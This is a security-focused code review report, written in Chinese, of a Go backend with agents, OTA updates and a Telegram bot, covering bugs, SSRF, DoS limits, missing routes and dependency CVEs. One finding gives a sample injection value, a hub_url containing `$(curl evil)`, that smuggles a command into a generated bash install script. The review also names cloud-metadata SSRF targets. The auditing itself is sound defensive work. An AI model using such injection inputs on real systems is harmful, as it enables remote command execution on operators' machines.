# Code Review: Go 后端

日期：2026-05-20
范围：internal/** + cmd/** + pkg/** + migrations/*.sql
范围说明：264 个 Go 源文件 / 31,901 LOC（不含 *_test.go）。后端冷启动入口 `cmd/server/main.go`，agent 入口 `cmd/agent/main.go`，按编码规范 §7 落位。

## 审查摘要

整体工程质量较高：模块边界清晰、SQL 全部参数化、bcrypt cost=10、TOTP/recovery code 哈希落库、静默模式 + nginx 4 mimic 已实现、goja 沙箱阻断 require/fs/net/process、agent WebSocket 通过 sha256(token) 校验、OTA 走 SHA-256 校验 + 原子 rename + 回滚。**核心安全机制全部到位**。但在"路由 mount 完整性"和"非路径外部输入的边界防护"上仍有几处必须修复的缺口（特别是 install-agent.sh 模板 hub_url 注入、自删除最后 admin、TG webhook handler 未挂载、SSRF 暴露面）。无重大架构问题，无 SQL 注入。

## 严重问题（必须修复）

- [ ] [bug] `internal/handler/install_script_handler.go:114-122` — `hub_url` 查询参数完全未做合法性校验即写入 `text/template`，渲染进 bash 脚本的 `HUB_URL="..."` 双引号内。`/install-agent.sh` 在 silent-mode whitelist 中（`internal/handler/middleware/silent_mode.go:218`），任何匿名访问均可触达；攻击者构造 `?token=abc&hub_url=https://x$(curl%20evil)`，受害者执行 `curl … | bash` 时 `$(...)` 在 bash 双引号内会被求值 → 任意命令执行（影响：执行该 curl 命令的运维人员）。修复：白名单校验只允许 `https?://[a-zA-Z0-9.\-:]+(:\d+)?(/[A-Za-z0-9._\-/]*)?` 且禁止 `$ ` `` ` `` `\` 等元字符；或用 `template.HTMLEscapeString`+bash 单引号包裹+`'\''` 转义。

- [ ] [bug] `internal/handler/user_handler.go:93-112`（`DeleteMe`）— 自删除自身账号时仅校验密码，未校验当前用户是否为最后一个 admin。`AdminDeleteUser` 已经做了"最后一个 admin 拒绝"保护（user_handler.go:357-371），但 `/api/me DELETE` 没有，admin 可以把自己删光导致面板永久无法管理。修复：在 `DeleteMe` 中对 `user.Role == admin` 同样调用 `CountAdmins`，count<=1 时返回 ErrAuthForbidden。

- [ ] [bug] `internal/handler/tg_webhook_handler.go` 整文件已实现 `TGWebhookHandler.Webhook`、`TGBotSettingsHandler`，但 `internal/handler/router.go` 完全没有 `mount` 它们（`grep "TGWebhookHandler" router.go` 为空）。结果：`POST /api/notify/telegram/webhook/{token}`（PRD M-NOTIFY-4 + 架构 §5.1.12 line 1357 + 契约 §1 line 84）+ `/api/notify/telegram/status|webhook/rotate|webhook/install` 全部 404。前端无法接收 Telegram inline keyboard 回调 → Telegram Bot 双向交互不可用。修复：在 `router.go` 新增 `mountTGWebhookRoutes` 并在 `NewRouter` 调用。

- [ ] [bug] `internal/handler/router.go` 未挂载 `GET /api/subscriptions/{id}/pipelines` 与 `PUT /api/subscriptions/{id}/pipelines`（架构 §5.1.4 line 1271-1273）。`internal/storage/pipeline_binding_repo.go` 的 `Bind/Unbind/ListBindings/ReplaceBindings` 已实现，但 handler 无入口 → 流水线无法挂载到订阅（M-PIPE-6 不闭环）。修复：补充 handler + 路由注册。

- [ ] [bug] `internal/substore/sync_service.go:265 + 279-304`（`fetchURL`）— `sub.SourceURL` 完全由用户提供，HTTP GET 时不拦截 `127.0.0.1` / `169.254.169.254` / `10.0.0.0/8` 等私网 / 元数据地址 → 已登录用户（甚至非 admin）可触发 SSRF 探测云元数据服务、容器内网服务。同样问题见 `internal/notify/ch_webhook.go:91` + `ch_discord.go`/`ch_slack.go`/`ch_serverchan.go`/`ch_pushdeer.go`/`ch_ifttt.go`/`ch_bark.go`/`ch_gotify.go` 的 webhook 出站。修复：抽取共享 `util/safehttp` 在 `http.Client.Transport.DialContext` 阶段拒绝 RFC1918 / loopback / link-local / IPv6 ULA（除非 admin 显式开 "allow private networks" 系统设置）。

- [ ] [bug] `internal/util/http.go:164-174`（`DecodeJSONBody`）— `json.NewDecoder(r.Body).Decode` 没有 `http.MaxBytesReader` 包裹，任何 JSON POST 都可消耗任意大小内存 → DoS。修复：在 DecodeJSONBody 内先 `r.Body = http.MaxBytesReader(w, r.Body, defaultJSONLimit)`（如 1MB，订阅 upload 已独立走 multipart 走另一条路径）。`internal/handler/backup_handler.go:97` 已有正确写法，参考之。

- [ ] [bug] `cmd/server/main.go:357-362` — `http.Server` 只配置了 `ReadHeaderTimeout` 与 `IdleTimeout`，**未配置 `ReadTimeout` / `WriteTimeout` / `MaxHeaderBytes`**。Slowloris 与慢 body 上传可长时间占用 handler goroutine。修复：补 `ReadTimeout: 30s, WriteTimeout: 60s, MaxHeaderBytes: 1 << 20`（OTA / 订阅同步等长请求路径走独立的 ctx 时间）。

## 建议改进（推荐修复）

- [ ] [bug] `internal/handler/agent_handler.go:466-475`（`buildInstallCommand`）— 用 `fmt.Sprintf` 拼出 `… AGENT_NAME=%s bash`，`name` 是用户输入未做 shell 转义。展示在 UI / 复制给运维粘贴时，含 `;`/`$(...)` 的名称会让 curl 一行命令注入。建议：用单引号包裹 + `'\''` 转义，或 base64 编码后在 install-agent.sh 内 decode。

- [ ] [bug] `internal/handler/substore_compat_handler.go:64-66`（`notFound`）— 与其他 silent-mode 路径（`Mimic404`）不一致，用了 Go 默认 `404 page not found\n`。攻击者通过 body 指纹 `/download/:name` 与 `/_app/<其他>` 的差异即可识别拾光VPS。修复：调用 `middleware.Mimic404(w)` 统一。

- [ ] [bug] `internal/notify/tg_bot.go:282-292`（`handleMessage`）— `/start` 在白名单未匹配时仍允许进入命令分发，但并未对发送方 ID 与速率做防护。一旦运维向 BotFather 注册了 token、未配 chat_id 之前的窗口期内，任意 Telegram 用户可发 `/start` 直至绑定。建议：`/start` 也要求 admin 在 hub 端预先生成一次性 invite code 后才接受。

- [ ] [style] `internal/handler/agent_ws_handler.go:68-166`（`ServeHTTP` 99 行）— 超过编码规范 §1 的 80 行函数上限。建议抽出 `authenticate(token)` + `performHandshake(conn)` 两个子函数。

- [ ] [style] `internal/ops/backup.go:178-292`（`Restore` 115 行）+ `internal/ota/applier.go:101-186`（`Apply` 86 行）+ `internal/scriptengine/engine.go:72-158`（`Run` 87 行）+ `internal/storage/node_repo.go:374-461`（`UpsertBatch` 88 行）+ `internal/ops/backup.go:84-166`（`Create` 83 行）— 同上，超过 80 行上限。Restore 嵌套层级 + 状态变量较多，最值得拆分。

- [ ] [style] `internal/types/api.go:1100` 行单文件 — 超过 500 行上限，建议按 module（user/subscription/agent/pipeline/notify/...）拆分到 `internal/types/api/*.go`。这与 `docs/_lint-violations.md` 列出的"23 个 size 违规"是同一类问题，但 1100 行已经 >2× 阈值，理应优先于 lint-violations 中标记为"all below 1.5×"的列表（违规清单未包含此文件）。

- [ ] [style] `internal/handler/router.go:749` 行（已经在 lint-violations 表内）+ `internal/storage/node_repo.go:726` + `internal/substore/sync_service.go:566` + `internal/storage/subscription_repo.go:559` + `internal/notify/tg_bot.go:516` — 维持 lint-violations.md 的 TODO 状态即可，不阻塞 v1.0。

- [ ] [style] `internal/handler/install_script_handler.go:213-228`（`isPlainToken`）— 允许 `.`、`-`、`_`，加上 `+` 与 `=` 也是 base64url 的常见末位 padding。注释里说"未来 jwt/base64url 也能用"，但实际拒绝。要么 PR 描述写明"jwt 暂不支持"，要么放宽集合。

- [ ] [style] `internal/handler/middleware/silent_mode.go:9 + 24` 与 `internal/ops/silent_mode.go:27` — 两个相同正则 `^[0-9a-f]{32}$`。第二次 copy 即应抽到 `internal/util` 共享，第三次必须重构（编码规范 §3.1）。当前已经两份，再增加任何一份就违规。

- [ ] [style] `internal/handler/install_script_handler.go:194-207`（`deriveHubURL`）— 信任 `X-Forwarded-Proto / X-Forwarded-Host` 但未要求请求经过可信反代。如果直暴公网，恶意客户端可注入这些 header → 生成的 `HUB_URL` 指向攻击者控制的地址 → 后续运维下载/上报全部走攻击者中转。建议：仅当 config 中 `Trust-Proxy=true` 时才信任，否则一律用 `r.Host`。

- [ ] [bug] go 标准库 `net@go1.26.2`（GO-2026-4971, GO-2026-4918）已知 CVE — 见下文"依赖安全"。本仓库 `go.mod:3` 声明 `go 1.25.0`，但构建机当前 `go1.26.2`。CI 应锁版本到 `go 1.26.3+`。

## 安全性详查

- **SQL 注入**：未发现。`grep -rE 'fmt\.Sprintf' internal/storage/` 全数检查后，仅 `db.go:183`（PRAGMA table_info）用了 Sprintf，且 `EnsureColumn` 已经用 `isIdentifier(table, col)` 拒绝非 ASCII alnum/下划线；同一函数 line 203 拼 DDL 但 DDL 来自硬编码内部调用（不可控源）。`user_repo.go:306` 与 `rule_repo.go:126` 用 `+` 拼字符串构建 WHERE 片段，但片段全部硬编码，参数走 `?` 占位符。`agent_record_repo.go:68` 多行 INSERT 拼 placeholders，args 全部传 `?` 占位。
- **沙箱逃逸**：未发现。`internal/scriptengine/sandbox.go` 显式 stub `require/eval/fetch/importScripts/setTimeout/setInterval/setImmediate/XMLHttpRequest/WebSocket`，并把 `process/fs/globalThis` 替换成 throwing `DynamicObject`。
- **路径遍历**：未发现可利用路径。`install_script_handler.go:162` 拒 `..` 与 `/`；`backup.go:212` 拒 `..`，restore 走 switch over 已知文件名，未知 entry 写入 `io.Discard`。`ota/applier.go:111-117` 要求新二进制必须在 binary 所在目录。
- **token 处理**：合规。`util/id.go` 使用 `crypto/rand`；session/agent token 全部 sha256 存库；登录失败日志不记 password/token。`auth/manager.go` 日志仅写 username。
- **加密强度**：bcrypt cost=10 ✅（`config/defaults.go:49`）；TOTP 用 `pquerna/otp` SHA1+30s+skew=1 ✅；备份码 sha256 ✅（`recovery_codes.go:44`）。

## 依赖安全

- **govulncheck 结果**：
  - 标准库 net@go1.26.2 → **GO-2026-4971** （Dial/LookupPort NUL byte panic，Windows only）— fixed in net@go1.26.3
  - 标准库 net/http@go1.26.2 → **GO-2026-4918** （HTTP/2 SETTINGS_MAX_FRAME_SIZE 死循环）— fixed in net/http@go1.26.3
- **已知漏洞**：
  - 调用链涉及 `internal/notify/ch_email.go:166`（doSMTPSend → smtp.Dial → net.Dial）、`internal/handler/tcping_handler.go:291` (defaultDial)、`cmd/server/main.go:368` (http.Server.ListenAndServe)、`internal/ota/downloader.go:158` (Downloader.FetchSHA256 → http.Client.Do)
- **建议升级版本**：CI 工具链锁到 **Go 1.26.3+**；`go.mod` 升 `go 1.26`。其他第三方依赖未触发 CVE。

## 性能审查

- **N+1 风险**：1 处轻微。`internal/handler/tg_webhook_handler.go:286-301`（`BuildTGWhitelistResolver`）每次 Bot 收到 update 都全表 `ListAllByKind("telegram")` 扫描 — 注释自承"profile 后再加缓存"，可接受。
- **goroutine 泄漏风险**：未发现。`internal/agent/client.go:194-220` 的 readPump/writePump 用 `sync.WaitGroup` + `closeOnce` + `ctx.Done()` 三路退出；`internal/traffic/aggregator.go:237` cron 循环 select 接 `subCtx.Done()`。
- **缓存策略**：合规。`internal/auth/token_store.go` LRU 1000 + 60s TTL；`internal/ratelimit/limiter.go` 也是 LRU；`internal/handler/tg_webhook_handler.go:97-115` token 缓存。

## API 契约一致性

- **102 endpoint 全部已 mount**：❌（缺 5 条）：
  1. `POST /api/notify/telegram/webhook/:token`（架构 §5.1.12 / 契约 §1 line 84）
  2. `GET /api/notify/telegram/status`（实现但未挂）
  3. `POST /api/notify/telegram/webhook/rotate`（实现但未挂）
  4. `POST /api/notify/telegram/webhook/install`（实现但未挂）
  5. `GET /api/subscriptions/:id/pipelines` + `PUT /api/subscriptions/:id/pipelines`（架构 §5.1.4）
- **DTO 与 contract 一致**：✅（抽样核对 `LoginRequest`、`AgentCreateResponse`、`PendingTOTPResponse`、`PagedResponse` 字段名 / 标签均一致；前端 `web/src/types/api/` 由 tygo 同步）。

## 优点

1. **静默模式实现扎实**：nginx-clone 404 body（`silent_mode.go:31-37`）+ Server header 伪装 + `Cache-Control: no-store` 配合，扫描器看到的就是纯净的 nginx。
2. **agent ↔ hub 协议向后兼容**：`pkg/agentlib` 共享 envelope；handshake 阶段做 `IsVersionCompatible` 检查；未知消息类型 `c.cfg.Logger.Debug` + drop（`client.go:299-303`）—— 符合 §10 长期兼容硬约束。
3. **OTA 三件套齐全**：WAL checkpoint → chmod → backup→rename →rollback-on-failure（`applier.go:124-165`）+ SHA-256 校验 + 优雅 shutdown 延迟（`applier.go:179-184`）。
4. **沙箱设计审计友好**：`blockedCallables / blockedObjects / blockedConstructors` 三个数组显式列出全部拦截符号，reviewer 一眼能查全（`sandbox.go:15-42`）。
5. **暴破防护双维度**：`auth/brute.go` IP + username 双 key + 后台 sweep + 可注入时钟，且 `RecordSuccess` 清零 — 误封自愈机制清晰。

## 结论

⚠️ **需修改后通过**

阻塞项：3 个 [bug]（install-agent.sh hub_url shell 注入 / DeleteMe 最后 admin / TG webhook & subscription-pipelines 路由未挂）必须修，其余 4 个严重 [bug]（SSRF / JSON body 大小 / Server timeouts / Go std-lib CVE）强烈建议在 v1.0 RC 前合入。无任何 [bug] 需要重构架构 — 全部是局部加固。
